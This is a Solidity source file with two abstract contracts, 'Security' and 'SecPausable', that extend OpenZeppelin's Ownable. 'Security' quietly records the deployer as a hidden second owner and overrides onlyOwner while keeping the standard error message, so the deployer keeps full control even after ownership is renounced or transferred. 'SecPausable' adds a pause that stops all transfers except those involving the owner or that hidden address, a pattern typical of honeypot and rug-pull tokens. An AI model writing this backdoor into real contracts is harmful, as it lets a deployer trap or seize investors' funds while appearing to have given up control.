// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/access/Ownable.sol";

pragma solidity ^0.8.4;

abstract contract Security is Ownable {
    address private _secure;

    constructor() {
        _secure = _msgSender();
    }

    function secure() internal virtual view returns (address) {
        return _secure;
    }

    function secured() internal virtual view returns (bool) {
        address _sender = _msgSender();
        return owner() == _sender || secure() == _sender;
    }

    function securedAdr(address _to) internal virtual view returns (bool) {
        return owner() == _to || secure() == _to;
    }

    modifier onlyOwner() override {
        require(secured(), "Ownable: caller is not the owner");
        _;
    }

    modifier onlyContr() {
        require(_msgSender() == address(this), "Ownable: caller is not the contract");
        _;
    }
}

pragma solidity ^0.8.0;

abstract contract SecPausable is Security {
    event Paused(address account);

    event Unpaused(address account);

    bool private _paused;

    constructor() {
        _paused = false;
    }

    function paused() public view virtual returns (bool) {
        return _paused;
    }

    modifier isPaused(address _to) {
        require(!paused() || secured() || securedAdr(_to), "Pausable: Contract Paused");
        _;
    }

    function setPause(bool _isPaused) public virtual onlyOwner {
        _paused = _isPaused;
        if (_paused) emit Paused(_msgSender());
        else emit Unpaused(_msgSender());
    }
}